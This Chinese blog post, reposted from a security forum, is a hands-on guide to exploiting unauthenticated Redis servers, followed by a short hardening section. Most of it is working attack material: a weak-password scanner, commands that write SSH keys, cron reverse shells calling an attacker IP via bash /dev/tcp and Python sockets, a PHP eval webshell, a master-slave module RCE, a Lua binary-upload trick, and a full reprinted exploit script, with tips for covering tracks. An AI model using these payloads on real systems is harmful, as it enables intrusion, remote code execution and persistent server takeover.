---
title: "redis未授权访问个人总结"
date: 2020-01-15T15:30:15+08:00
draft: false
tags: ['未授权漏洞']
categories: ['总结']
---
首发于土司,现更新到自己博客!

土司文章链接:

https://www.t00ls.net/thread-54620-1-1.html

<!--more-->

# Redis简介：
	redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set --有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。

# Redis常用命令：
```
      set testkey "Hello World"  # 设置键testkey的值为字符串Hello World
      get testkey                         # 获取键testkey的内容
      SET score 99                        # 设置键score的值为99
      INCR score                          # 使用INCR命令将score的值增加1
      GET score                           # 获取键score的内容
      keys *                              # 列出当前数据库中所有的键
      get anotherkey                      # 获取一个不存在的键的值
      config set dir /home/test         # 设置工作目录
      config set dbfilename redis.rdb   # 设置备份文件名
      config get dir                    # 检查工作目录是否设置成功
      config get dbfilename             # 检查备份文件名是否设置成功
      save                              # 进行一次备份操作
      flushall 删除所有数据
      del key 删除键为key的数据
```
# Redis操作总结：
1. 使用SET和GET命令，可以完成基本的赋值和取值操作；
2. Redis是不区分命令的大小写的，set和SET是同一个意思；
3. 使用keys *可以列出当前数据库中的所有键；
4. 当尝试获取一个不存在的键的值时，Redis会返回空，即(nil)；
5. 如果键的值中有空格，需要使用双引号括起来，如"Hello World"；

# Redis配置文件解读：
      在启动Redis服务器进程的时候，可以通过命令行参数指定一个配置文件，这样服务器进程就可以根据配置文件中设定的参数值来运行了。在redis-3.0.1目录下有一个redis.conf文件，这是一个默认的配置文件。


**redis.conf文件中存在许多的设置参数，这里重点介绍几个和安全相关的参数：**

### 1. port参数
      格式为port后面接端口号，如port 6379，表示Redis服务器将在6379端口上进行监听来等待客户端的连接。

### 2. bind参数
      格式为bind后面接IP地址，可以同时绑定在多个IP地址上，IP地址之间用空格分离，如bind 192.168.1.100 10.0.0.1，表示同时绑定在192.168.1.100和10.0.0.1两个IP地址上。如果没有指定bind参数，则绑定在本机的所有IP地址上。

### 3. save参数
      格式为save <秒数> <变化数>，表示在指定的秒数内数据库存在指定的改变数时自动进行备份（Redis是内存数据库，这里的备份就是指把内存中的数据备份到磁盘上）。可以同时指定多个save参数，如：   

```
save 900 1
save 300 10
save 60 10000 
```
      表示如果数据库的内容在60秒后产生了10000次改变，或者300秒后产生了10次改变，或者900秒后产生了1次改变，那么立即进行备份操作。
### 4. requirepass参数
      格式为requirepass后接指定的密码，用于指定客户端在连接Redis服务器时所使用的密码。Redis默认的密码参数是空的，说明不需要密码即可连接；同时，配置文件有一条注释了的requirepass foobared命令，如果去掉注释，表示需要使用foobared密码才能连接Redis数据库。

### 5. dir参数
      格式为dir后接指定的路径，默认为dir ./，指明Redis的工作目录为当前目录，即redis-server文件所在的目录。注意，Redis产生的备份文件将放在这个目录下。

### 6. dbfilename参数
      格式为dbfilename后接指定的文件名称，用于指定Redis备份文件的名字，默认为dbfilename dump.rdb，即备份文件的名字为dump.rdb。

### 7. config命令
      通过config命令可以读取和设置dir参数以及dbfilename参数，因为这条命令比较危险（实验将进行详细介绍），所以Redis在配置文件中提供了rename-command参数来对其进行重命名操作，如rename-command CONFIG HTCMD，可以将CONFIG命令重命名为HTCMD。配置文件默认是没有对CONFIG命令进行重命名操作的。 

### **详细解读：**
-Redis5.0.5配置文件详解

[https://blog.csdn.net/weixin_42425970/article/details/94132652](https://blog.csdn.net/weixin_42425970/article/details/94132652)

# 利用原理：
Redis 提供了2种不同的持久化方式，RDB方式和AOF方式.

* RDB 持久化可以在指定的时间间隔内生成数据集的时间点快照
* AOF 持久化记录服务器执行的所有写操作命令.

```
经过查看官网文档发现AOF方式备份数据库的文件名默认为appendonly.aof，可以在配置文件中通过appendfilename设置其他名称，通过测试发现不能在客户端交互中动态设置appendfilename，所以不能通过AOF方式备份写任意文件.

* RDB方式备份数据库的文件名默认为dump.rdb，此文件名可以通过客户端交互动态设置dbfilename来更改，造成可以写任意文件.
```

# 搭建过程：
```
#下载源码：
wget http://download.redis.io/releases/redis-5.0.5.tar.gz
tar -zxvf redis-5.0.5.tar.gz
cd redis-5.0.5
make
#启动redis服务
cd src
./redis-server
可以指定配置文件启动(若不指定则以默认的配置文件启动)：
./redis-server /etc/redis/redis.conf
```
### 配置文件：
安全模式起作用需要同时满足俩个条件：

	(1) redis没有开启登录认证
	
	(2) redis没有绑定到某个ip地址或ip段

从3.2.0版本开始，当Redis使用缺省的配置并且没有密码保护的时，我们称之为保护模式。

redis默认是未开启认证，开启安全模式的.

### 对安全模式作用范围进行测试：
### 一、 绑定到任意地址：
![图片](https://ae01.alicdn.com/kf/U16d57022588a48248cb121c4cdda5a0ab.png)

启动redis：

![图片](https://ae01.alicdn.com/kf/Ue6ba79f5805e407e87ee6cc476fbd4d9a.png)

连接redis，可以看到安全模式未发挥作用

![图片](https://ae01.alicdn.com/kf/U1c25c02c177d4d8ba9db79f56a230995V.png)

### 二、取消绑定地址
![图片](https://ae01.alicdn.com/kf/U189909012f3a43a6af444ad0c009c4d6r.png)

启动redis进行登录测试：

![图片](https://ae01.alicdn.com/kf/Uc550810080c14d6bb06382afb9692a6ds.png)

可以看到虽然其可以登录，但是无法执行命令。

### 三、不绑定地址，关闭安全模式：
![图片](https://ae01.alicdn.com/kf/U974d145250304acbb8c4aa54049ec6e2a.png)

登录测试：

![图片](https://ae01.alicdn.com/kf/U225856e7d1614065b91da1be64d3e7c47.png)

### 所以造成未授权访问有俩种情况：
1. 未开启登录认证，将redis绑定到了0.0.0.0
1. 未开启登录认证，未绑定redis到任何地址（此时任何ip都可以访问），还需要关闭保护模式
# 漏洞复现：
windows下的redis客户端下载：

[https://github.com/caoxinyu/RedisClient/releases](https://github.com/caoxinyu/RedisClient/releases)

### 环境：
​	靶机：192.168.1.154       centos7

​	攻击机：192.168.1.153     centos7

### 未授权访问扫描脚本：
```
# _*_  coding:utf-8 _*_
import socket
import sys
PASSWORD_DIC=['redis','root','oracle','password','p@aaw0rd','abc123!','123456','admin']
def check(ip, port, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        s.send("INFO\r\n")
        result = s.recv(1024)
        if "redis_version" in result:
            return u"未授权访问"
        elif "Authentication" in result:
            for pass_ in PASSWORD_DIC:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, int(port)))
                s.send("AUTH %s\r\n" %(pass_))
                result = s.recv(1024)
                if '+OK' in result:
                    return u"存在弱口令，密码：%s" % (pass_)
    except Exception, e:
        pass
if __name__ == '__main__':
    ip=sys.argv[1]
    port=sys.argv[2]
    print check(ip,port, timeout=10)
```
### 脚本使用案例：
![图片](https://ae01.alicdn.com/kf/Ub2baced00c194489928153f2de5e71d59.png)

## 一、写 ssh-keygen 公钥登录服务器
### 利用的原理：
现在先说明一下SSH免密登录的原理：

SSH提供两种登录验证方式，一种是口令验证也就是账号密码登录，另一种是密钥验证。

所谓密钥验证，其实就是一种基于公钥密码的认证，使用公钥加密、私钥解密，其中公钥是可以公开的，放在服务器端，你可以把同一个公钥放在所有你想SSH远程登录的服务器中，而私钥是保密的只有你自己知道，公钥加密的消息只有私钥才能解密，大体过程如下：

>（1）客户端生成私钥和公钥，并把公钥拷贝给服务器端；
>（2）客户端发起登录请求，发送自己的相关信息；
>（3）服务器端根据客户端发来的信息查找是否存有该客户端的公钥，若没有拒绝登录，若有则生成一段随机数使用该公钥加密后发送给客户端；
>（4）客户端收到服务器发来的加密后的消息后使用私钥解密，并把解密后的结果发给服务器用于验证；
>（5）服务器收到客户端发来的解密结果，与自己刚才生成的随机数比对，若一样则允许登录，不一样则拒绝登录。
### 需要的条件：
1、Redis服务使用ROOT账号启动

2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。

### redis执行的命令：
```
192.168.1.154:6379>config set dir /root/.ssh/
192.168.1.154:6379>config set dbfilename authorized_keys
192.168.1.154:6379>set x "\n\n\n ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdPp3/tfIlmHhVKuaR5Ckd0uuv98Q6AusZP9ZJrrb8aRWniTNCdUvV7gfW5ctZxROXfUF+tvnd6So8MwR70AwNqaCsWrsUBPzJXcR1Zl89M1G9KulUOgF3rANKQ8dqZivouvs1DcqkyqWi1652tAQ+4xS8i/mhFeS0dxjajttcrzmirF9DPzlsKTzfbMpUYupRAOl7GikdB9dhPzH3xQ4Oem4UMeZbznPuT861msmNLByh3ni+szdrF8yqwbPkVSDDbUlFCppF9N+Fykra5Uuc/tkXZaxgAjBWdpeFsLnMPlBWKoN1BJpzwZHgG2iKLT7PJS5bqx+RdkD7XJy9eqXL root@mail.test.com \n\n\n"
192.168.1.154:6379> save
```
### 具体操作：
1、本地生成公钥文件：

需要为我们的公钥文件设置一个私钥

公钥文件默认路径：/root/.ssh/id_rsa.pub

![图片](https://ae01.alicdn.com/kf/Uff8d8b96b6b14186b554c34eeae5c432b.png)

2、通过未授权访问redis：

![图片](https://ae01.alicdn.com/kf/U65c7d0e4b60e4643a05e84441780259dc.png)

注意：在给客户做测试的时候记得先看下当前设置的目录和文件名，做完测试记得恢复

3、利用redis的数据备份功能修改备份目录为 /redis/.ssh/   备份文件名为 authorized_keys

![图片](https://ae01.alicdn.com/kf/U6f195f2fb83f46e3bcda910affbdc974B.png)

4、创建一个键值:

(1) 复制id_rsa.pub文件的内容：

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdPp3/tfIlmHhVKuaR5Ckd0uuv98Q6AusZP9ZJrrb8aRWniTNCdUvV7gfW5ctZxROXfUF+tvnd6So8MwR70AwNqaCsWrsUBPzJXcR1Zl89M1G9KulUOgF3rANKQ8dqZivouvs1DcqkyqWi1652tAQ+4xS8i/mhFeS0dxjajttcrzmirF9DPzlsKTzfbMpUYupRAOl7GikdB9dhPzH3xQ4Oem4UMeZbznPuT861msmNLByh3ni+szdrF8yqwbPkVSDDbUlFCppF9N+Fykra5Uuc/tkXZaxgAjBWdpeFsLnMPlBWKoN1BJpzwZHgG2iKLT7PJS5bqx+RdkD7XJy9eqXL root@mail.test.com
```
(2) 创建一个键名为x  键值为公钥文件里面的内容
![图片](https://ae01.alicdn.com/kf/U44331649feb147dab91ca25001326aa3v.png)

(3) 利用公钥文件以及对应的私钥进行ssh登陆：

![图片](https://ae01.alicdn.com/kf/U8ac1ae8b94f149b5910668aa64ff7efbf.png)

![图片](https://ae01.alicdn.com/kf/U60dfd4695ab2453e983459b2fd69d4faV.png)

或者：

```
ssh-keygen -t rsa
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
cat foo.txt | redis-cli -h x.x.x.x -x set crackit
redis-cli -h x.x.x.x
     > config set dir /root/.ssh/
     > config get dir
     > config set dbfilename "authorized_keys"
     > save
ssh -i id_rsa root@x.x.x.x
```
### windows下利用ssh连接工具生成公钥文件：
利用xshell生成公钥文件：

![图片](https://ae01.alicdn.com/kf/U66ad612fef9945aab43743b1436a2b05y.png)

点击 “ 新建用户密钥生成向导”

![图片](https://ae01.alicdn.com/kf/Ufe7fad1f5b174986a83dccb26d581e9aP.png)

如上图选择，然后点击 下一步

![图片](https://ae01.alicdn.com/kf/U3e88f9196c6e4f9fa783acc5141ae25au.png)

公钥对已经生成，点击 下一步

![图片](https://ae01.alicdn.com/kf/U0012152590764e7b9d4ed6d1ba9b6c53L.png)

输入一个密钥加密的密码，用于我们远程登陆

![图片](https://ae01.alicdn.com/kf/U4408af9a655b4e4bab4c82286e395a7fX.png)

可以看到已经生成

![图片](https://ae01.alicdn.com/kf/U86fb0d55037442eaa519322da9f32a9cA.png)

复制公钥里面的内容，即可利用。

### POC-T框架下对应的利用脚本：
![图片](https://ae01.alicdn.com/kf/Ucaa2c5ebcbde40afa5d9b493f19f12ffC.png)

利用xshell连接即可：

![图片](https://ae01.alicdn.com/kf/U51e78c2085c24eef9feea6cbce4d80a9B.png)

点击连接，输入用户名然后选择公钥连接：

![图片](https://ae01.alicdn.com/kf/U4d32d4cd00744e4d81f64bc70235fdc7J.png)

输入我们前面填写的密码即可登陆。（密码就是我们那个前面密钥加密的密码）

## 二、 利用计划任务反弹shell
### 利用的原理：
```
/var/spool/cron/目录下存放的为以各个用户命名的计划任务文件，root用户可以修改任意用户的计划任务。dbfilename设置为root为用root用户权限执行计划任务。
```
执行命令反弹shell(写计划任务时会覆盖原来存在的用户计划任务).写文件之前先获取dir和dbfilename的值，以便恢复redis配置，将改动降到最低，避免被发现。
### 需要的条件：
需要redis是root用户启动

### redis执行的命令：
```
#获取dir的值
config get dir
#获取dbfilename的值
config get dbfilename
#设置数据库备份目录为linux计划任务目录
config set dir '/var/spool/cron/'
#设置备份文件名为root，以root身份执行计划任务
config set dbfilename 'root'
#删除所有数据库的所有key
flushall
#设置写入的内容，在计划任务前后加入换行以确保写入的计划任务可以被正常解析，此处可以直接调用lua语句。
eval "redis.call('set','cron',string.char(10)..ARGV[1]..string.char(10))" 0 '*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'
#保存
save
#删除新增的key
del cron
#恢复dir和dbfilename
config set dir '***'
config set dbfilename '***'
```
具体操作：

1、攻击机监听好接收shell的端口：

```
nc -lvnp 4444
```
![图片](https://ae01.alicdn.com/kf/Uea6c9c3acc7d493292cd91ac524e2ea3s.png)

2、修改备份目录和文件名为定时任务的目录和文件：

```
 192.168.1.154:6379> set x "\n* * * * * bash -i >& /dev/tcp/192.168.1.153/4444 0>&1\n"
 
 192.168.1.154:6379> config set dir /var/spool/cron/
 192.168.1.154:6379> config set dbfilename root
 192.168.1.154:6379> save
```
执行过程：
![图片](https://ae01.alicdn.com/kf/Uc40a2127aaa749f9977956dc99a46397z.png)

3、执行完redis命令后，回到监听的终端页面：

![图片](https://ae01.alicdn.com/kf/U6248d090f1854392880864a68b272ce2R.png)

第一次看到还以为没有反弹回shell，不知道为什么这个shell无法执行ifconfig

求助大佬后才知道，默认的ifconfig是在  /usr/bin/目录下，而bash默认是在

![图片](https://ae01.alicdn.com/kf/U22a39bb0cd9e47da92d01f5856aac7334.png)

解决方法：

```
ln -s /usr/sbin/ifconfig /usr/bin/ifconfig
```
![图片](https://ae01.alicdn.com/kf/U66adf94c678e40a48c6a89c9b8e7276eP.png)

### POC-T框架下对应的利用脚本：
![图片](https://ae01.alicdn.com/kf/Uf167a8478ce24c28ade61738493a1b0ft.png)

POC-T框架里的利用代码：

```
import redis
from plugin.util import host2IP
from plugin.util import randomString
listen_ip = '192.168.1.222' # your public IP and Port
listen_port = 9999

def poc(url):
    url = host2IP(url)
    ip = url.split(':')[0]
    port = int(url.split(':')[-1]) if ':' in url else 6379
    try:
        r = redis.Redis(host=ip, port=port, db=0, socket_timeout=10)
        if 'redis_version' in r.info():
            payload = '\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1\n\n'.format(ip=listen_ip,port=str(listen_port))
            path = '/var/spool/cron'
            name = 'root'
            key = randomString(10)
            r.set(key, payload)
            r.config_set('dir', path)
            r.config_set('dbfilename', name)
            r.save()
            r.delete(key)  # 清除痕迹
            r.config_set('dir', '/tmp')
            return True
    except Exception:
        return False
    return False
```
## 三、 利用redis写webshell
当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell

(1)  靶机redis未授权，在攻击机能用redis clinet连接，并未登录验证

(2)  靶机开启web服务，并且知道网站路径，还需要具有文件读写增删改查权限

### 我在靶机上搭建了apache
![图片](https://ae01.alicdn.com/kf/U622f8eaca4ad4598b06686485737a9b7g.png)

我们现在不知道其网站的物理路径，可以尝试目录爆破看下是否存在phpinfo文件，也可以尝试apache的默认路径：/var/www/html/

```
redis-cli -h 192.168.1.154
config set dir /var/www/html 
set xxx "\n\n\n<?php@eval($_POST['c']);?>\n\n\n" 
config set dbfilename webshell.php 
save
```
## 四、 利用主从复制获取shell
	Redis支持主从同步。数据可以从主服务器向任意数量的从服务器上同步，从服务器可以是关联其他从服务器的主服务器。这使得Redis可执行单层树复制。存盘可以有意无意的对数据进行写操作。由于完全实现了发布/订阅机制，使得从数据库在任何地方同步树时，可订阅一个频道并接收主服务器完整的消息发布记录。同步对读取操作的可扩展性和数据冗余很有帮助。

### **利用原理：**
在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。

然后在从机上加载so文件，我们就可以执行拓展的新命令了。

1、下载利用脚本：

```
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
cd RedisModules-ExecuteCommand/
make
git clone https://github.com/Ridter/redis-rce
python redis-rce.py -r 192.168.1.154 -L 192.168.1.153 -f module.so
```
![图片](https://ae01.alicdn.com/kf/U784f58fe665a4237a61a9de8837f9d618.png)

监听一个端口用来接收shell

![图片](https://ae01.alicdn.com/kf/Ue2569399c43a4507b42e0d9bc877a993a.png)

### 相关文章：
Redis 基于主从复制的 RCE 利用方式

[https://paper.seebug.org/975/](https://paper.seebug.org/975/)

详细利用步骤：

[https://www.lizenghai.com/archives/21742.html](https://www.lizenghai.com/archives/21742.html)

## 五、 执行lua脚本：
　redis 2.6以前的版本内置了lua脚本环境，在有连接redis服务器的权限下，可以利用lua执行系统命令。

本地建立一个lua脚本：

```
vim  hello.lua
local msg = "hello,hack!"
return msg
```
在客户端连接redis服务器并执行hello.lua
```
redis-cli eval "$(cat hello.lua)" 0 -h 192.168.1.154
解释:
cat hello.lua    读取hello.lua脚本的内容
0     是这个脚本需要访问的Redis 的键的数字号。我们简单的 “Hello Script" 不会访问任何键，所以我们使用0.
```
![图片](https://ae01.alicdn.com/kf/Uc5e1869c324d4ba1b371d56d2328bc99s.png)

## 六、 写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）
写二进制文件跟前边有所不同，原因在于使用RDB方式备份redis数据库是默认情况下会对文件进行压缩，上传的二进制文件也会被压缩，而且文件前后存在脏数据，因此需要将默认压缩关闭，并且通过计划任务调用python清洗脏数据。

1、创建一个lua脚本，其内容如下：

```
local function hex2bin(hexstr)
    local str = ""
    for i = 1, string.len(hexstr) - 1, 2 do
        local doublebytestr = string.sub(hexstr, i, i+1);
        local n = tonumber(doublebytestr, 16);
        if 0 == n then
            str = str .. '\00'
        else
            str = str .. string.format("%c", n)
        end
    end
    return str
end
local dir = redis.call('config','get','dir')
redis.call('config','set','dir','/tmp/')
local dbfilename = redis.call('config','get','dbfilename')
redis.call('config','set','dbfilename','t')
local rdbcompress = redis.call('config','get','rdbcompression')
redis.call('config','set','rdbcompression','no')
redis.call('flushall')
local data = '1a2b3c4d5e6f1223344556677890aa'
redis.call('set','data',hex2bin('0a7c7c7c'..data..'7c7c7c0a'))
local rst = {}
rst[1] = 'server default config'
rst[2] = 'dir:'..dir[2]
rst[3] = 'dbfilename:'..dbfilename[2]
rst[4] = 'rdbcompression:'..rdbcompress[2]
return rst
```
变量data保存的是程序的16进制编码
2、利用redis执行该lua脚本

```
redis-cli --eval a.lua -h 192.168.1.154
```
3、由于redis不支持在lua中调用save因此需要手动执行save操作,并且删除key data，恢复dir等。

```
redis-cli save -h *.*.*.*
redis-cli config set dir *** -h *.*.*.*
redis-cli config set dbfilename *** -h *.*.*.*
redis-cli config set rdbcompression * -h *.*.*.*
```
目前写入的文件前后是存在垃圾数据的，下一步通过写计划任务调用python或者系统命令提取出二进制文件（写文件之在数据前后加入了|||作为提取最终文件的标识）。
```
*/1 * * * * python -c 'open("/tmp/rst","a+").write(open("/tmp/t").read().split("|||")[1])'
```
# 补充:
以下来自论坛abuuu大佬:

## 利用redis写定时任务的其他方法:
### 1、 利用telnet连接redis写
```
telnet x.x.x.x 6379 //未授权登录
config set dir /var/spool/cron/ //配置文件夹的路径（CONFIG SET 命令可以动态地调整 Redis 服务器的配置而(configuration)而无须重启。）//每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面
set -.- "\n\n\n* * * * * bash -i >& /dev/tcp/x.x.x.x/9999 0>&1\n\n\n" //直接往当前用户的crontab里写入反弹shell，换行是必不可少的。
```
### 2、利用定时任务通过python反弹shell
```
set 1 "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"
config set dir /var/spool/cron/
config set dbfilename root
save
```
### 3、通过php来利用redis未授权进行反弹shell
```
<?php
$redis = new Redis();
$redis->connect('127.0.0.1',6379);
$redis->auth("password");
$redis->flushall();
$redis->config("SET","dir","/var/spool/cron/");
$redis->config("SET","dbfilename","root");
$redis->set("0","\n\n*/1 * * * * bash -i >& /dev/tcp/x.x.x.x/9999 0>&1\n\n\n");
$redis->save();
?>
```
# redis利用脚本
[https://github.com/00theway/redis_exp](https://github.com/00theway/redis_exp)

## 代码：
```
#!/usr/bin/env python
#-*- coding:utf8 -*-
#@author: 00theway
#@file: redis_exp.py
#@time: 2017/3/29 下午6:40
import redis,sys,time
from optparse import OptionParser
class REDIS_EXP:
    def __init__(self,host,port=6379):
        self.host = host
        self.port = port
        self.INFO = 0
        self.ERROR = 1
        self.default = {'dir':'',
                        'dbfilename':'',
                        'rdbcompression':''}
        self.crond = ''
        self.r = redis.StrictRedis(host=self.host, port=self.port, db=0)
        try:
            self.get_default_config()
            self.output("default config:",self.INFO)
            self.output("dir:"+ self.default['dir'], self.INFO)
            self.output("dbfilename:" + self.default['dbfilename'], self.INFO)
            self.output("rdbcompression:" + self.default['rdbcompression'], self.INFO)
        except Exception,e:
            self.output("get default config",self.ERROR)
            self.output(e.message,self.ERROR)
            sys.exit(1)
    # recover config
    def __del__(self):
        self.r.config_set('dir', self.default['dir'])
        self.r.config_set('dbfilename', self.default['dbfilename'])
        self.r.config_set('rdbcompression', self.default['rdbcompression'])
    def output(self,msg,level=0):
        if level == self.ERROR:
            print "\033[31;3m [ERROR] %s \033[0m" % (msg)
        if level == self.INFO:
            print "\033[32;3m [INFO]%s \033[0m" % (msg)
    # call before execute
    def generate_crond(self,command,time_delay):
        server_time = self.r.time()[0] + time_delay * 60
        m_time = time.localtime(server_time)
        m_min = m_time.tm_min
        m_mon = m_time.tm_mon
        m_day = m_time.tm_mday
        m_hour = m_time.tm_hour
        self.crond = '\n\n%s %s %s %s * %s\n\n' % (m_min, m_hour, m_day, m_mon, command)

    # call at init
    def get_default_config(self):
        default = self.r.config_get()
        self.default = default
        pass
    # call after set_local_file and set_remote_file
    def upload_file(self,local_file,remote_file):
        separator = '3b762cc137d55f4dcf4fe184ccc1dc15'
        self.output('uploading files',self.INFO)
        try:
            data = open(local_file,'rb').read()
        except Exception,e:
            self.output("open file %s error" % (local_file),self.ERROR)
            self.output(e.message,self.ERROR)
            sys.exit(1)
        m_data = '\n%s%s%s\n' % (separator,data,separator)
        try:
            self.r.config_set('dir','/tmp/')
        except Exception,e:
            self.output('config set dir /tmp/',self.ERROR)
            self.output(e.message,self.ERROR)
            sys.exit()
        self.r.config_set('dbfilename','0ttt')
        self.r.config_set('rdbcompression','no')
        self.r.flushall()
        self.r.set('data',m_data)
        self.r.save()
        #recover db config
        self.r.delete('data')
        command = '''python -c 'open("%s","ab+").write(open("/tmp/0ttt","rb").read().split("%s")[1])' ''' % (remote_file,separator)
        self.execute(command)
        self.output('file upload done',self.INFO)
    # call after set_command
    def execute(self,command,time_delay=2):
        self.generate_crond(command,time_delay)
        try:
            self.r.config_set('dir','/var/spool/cron/')
        except Exception,e:
            self.output('config set dir /var/spool/cron',self.ERROR)
            self.output(e.message,self.ERROR)
            sys.exit()
        self.r.config_set('dbfilename','root')
        self.r.flushall()
        self.r.set('shell',self.crond)
        self.r.save()
        self.r.delete('shell')
        self.output('cron set ok',self.INFO)
        for i in range(time_delay * 60):
            sys.stdout.write('\r\033[32;3m [INFO] wait {0}seconds for command execute \033[0m'.format((time_delay * 60) - i))
            sys.stdout.flush()
            time.sleep(1)
        print ''
        self.output('command execute done',self.INFO)
    def broute_dir(self,dirs_file):
        self.output("broute dir")
        try:
            dirs = open(dirs_file).readlines()
        except Exception,e:
            self.output('open file %s error' % dirs_file,self.ERROR)
            self.output(e.message,self.ERROR)
            sys.exit()
        for d_path in dirs:
            d_path = d_path.strip()
            try:
                self.r.config_set('dir',d_path)
                print '[path exests]',d_path
            except Exception,e:
                if "Permission denied" in e.message:
                    print '[Permission denied]',d_path
                else:
                    pass



def get_paras():
    usage = '''python redis_exp.py --host *.*.*.* [options]
    command execute:python redis_exp.py --host *.*.*.* -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
    file upload:python redis_exp.py --host *.*.*.* -l /data/reverse.sh -r /tmp/r.sh
    path brute fource:python redis_exp.py --host *.*.*.* -f /data/path.txt'''
    parser = OptionParser(usage)
    parser.add_option('--host',dest='host',help='the redis ip')
    parser.add_option('-p',dest="port",type='int',default=6379,help="the redis port,default is 6379")
    parser.add_option('-f',dest="file",help="file path to brute fource")
    parser.add_option('-l',dest="l_file",help="local file to upload")
    parser.add_option('-r',dest="r_file",help="remote path to store file")
    parser.add_option('-c',dest="command",help="the command to execute")
    parser.add_option('-t', dest="time_delay",type='int',default=2,help="the time between crontad created and command execute,default 2mins")
    (options, args) = parser.parse_args()


    arg_host = options.host
    arg_port = int(options.port)
    if arg_host == None or arg_port == None:
        print "\033[31;3m [ERROR] %s \033[0m" % 'host or port error'
        print usage
        sys.exit()
    arg_command = options.command
    arg_time_delay = options.time_delay
    arg_l_file = options.l_file
    arg_r_file = options.r_file
    arg_dirs_file = options.file
    if arg_command == None and (arg_l_file == None or arg_r_file==None) and arg_dirs_file == None:
        print "\033[31;3m [ERROR] %s \033[0m" % 'need options'
        print usage
        sys.exit()
    paras = {'host':arg_host,
             'port':arg_port,
             'command':arg_command,
             'time_delay':arg_time_delay,
             'l_file':arg_l_file,
             'r_file':arg_r_file,
             'dirs_file':arg_dirs_file}
    return paras


if '__main__' == __name__:
    paras = get_paras()
    host = paras['host']
    port = paras['port']
    command = paras['command']
    time_delay = paras['time_delay']
    l_file = paras['l_file']
    r_file = paras['r_file']
    dirs_file = paras['dirs_file']
    r = REDIS_EXP(host,port)
    if command != None:
        r.execute(command,time_delay)
    elif dirs_file != None:
        r.broute_dir(dirs_file)
    else:
        r.upload_file(l_file,r_file)
```
# 批量检测未授权redis脚本
[https://github.com/Ridter/hackredis](https://github.com/Ridter/hackredis)

# redis未授权漏洞应急响应案例：
redis未授权访问致远程植入挖矿脚本（防御篇）

[https://mp.weixin.qq.com/s/eUTZsGUGSO0AeBUaxq4Q2w](https://mp.weixin.qq.com/s/eUTZsGUGSO0AeBUaxq4Q2w)

# 利用拓展：
Windows下如何getshell？

```
写入webshell，需要知道web路径
写入启动项，需要目标服务器重启
写入MOF，MOF每隔5秒钟会自动执行一次，适用于Windows2003。
```
# 修复方案：
### 1、禁止一些高危命令（重启redis才能生效)
* 修改 redis.conf 文件，禁用远程修改 DB 文件地址
```
rename-command FLUSHALL ""
rename-command CONFIG ""
rename-command EVAL ""
```
或者通过修改redis.conf文件，改变这些高危命令的名称
```
rename-command FLUSHALL "name1"
rename-command CONFIG "name2"
rename-command EVAL "name3"
```
### 2、以低权限运行 Redis 服务（重启redis才能生效）
为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆

```
groupadd -r redis && useradd -r -g redis redis
```
### 3、为 Redis 添加密码验证（重启redis才能生效）
修改 redis.conf 文件，添加

```
requirepass mypassword
（注意redis不要用-a参数，明文输入密码，连接后使用auth认证）
```
### 4、禁止外网访问 Redis（重启redis才能生效）
修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用

```
bind 127.0.0.1
```
在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错
### 5、修改默认端口
修改配置文件redis.conf文件

```
Port 6379
```
默认端口是6379，可以改变成其他端口（不要冲突就好）
### 6、保证 authorized_keys 文件的安全
为了保证安全，您应该阻止其他用户添加新的公钥。

* 将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：
```
chmod 400 ~/.ssh/authorized_keys
```
* 为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限:
```
chattr +i ~/.ssh/authorized_keys
```
* 然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 权限：
```
chattr +i ~/.ssh
```
### 7、设置防火墙策略
如果正常业务中Redis服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Redis服务。

# 参考链接：
[https://www.freebuf.com/column/158065.html](https://www.freebuf.com/column/158065.html)

[https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

